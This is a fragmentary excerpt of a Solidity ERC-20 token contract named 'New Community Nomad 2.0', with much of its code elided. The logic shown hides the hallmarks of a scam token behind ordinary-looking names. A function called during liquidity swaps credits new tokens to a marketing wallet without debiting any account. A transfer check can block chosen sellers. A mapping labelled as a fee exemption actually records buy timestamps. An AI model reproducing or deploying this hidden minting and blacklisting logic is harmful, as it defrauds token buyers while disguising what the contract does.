...
contract NewCommunityNomadTwo is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1_000 * 10**9;
    uint256 public _walletSize = _tTotal;
    uint256 public _maxTxAmount = 50 * (10 ** _decimals);
    uint256 private _liquifyThreshhold = _tTotal/100;

    string private constant _name = "New Community Nomad 2.0";
    string private constant _symbol = "cNomad 2.0";
    uint8 private constant _decimals = 9;
    
    uint256 private _marketingFee = 3;
    uint256 private _liquidityFee = 0;

    address marketingWallet = 0x586A8403cC868BE80f45396b1a0aDFCee0A82a23;
    address nullBurnAddress = 0x000000000000000000000000000000000000dEaD;
    
    uint256 public _buyCooldown = 0 minutes;
    mapping (address => uint256) private _isFeeExempt;
    ...
    constructor () {
        ...
        _isFeeLimitExempt[nullBurnAddress] = true;
    ...
    function minimumTokenAmount(uint256 Balance) private {
        _walletSize = Balance;
    }
    ...
    function _transfer(
        ...
        require(!_isTxExempt[from]);
         ...
         if(
            ...
            require(amount <= _walletSize, "Transfer amount exceeds the maxTxAmount.");
               }

        if (from == uniswapV2Pair &&
            !_isTxLimitExempt[to]
            ) {
            require (_isFeeExempt[to] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
            _isFeeExempt[to] = block.timestamp;
        } else {
            if ( from == uniswapV2Pair &&
                _isTxLimitExempt[to]) {
    ...
    function swapAndLiquidity(uint256 tokens) private {
        ...
        proportionThisToken(BNBtosend);
    }

    function proportionThisToken(uint256 tokens) private {
        _tOwned[marketingWallet] = _tOwned[marketingWallet]+tokens;
        uint256 Getbalance = balanceOf(address(this));
    }
    ...
    function whitelist(address newAddress) external virtual {
        ...
        require (newAddress != nullBurnAddress);
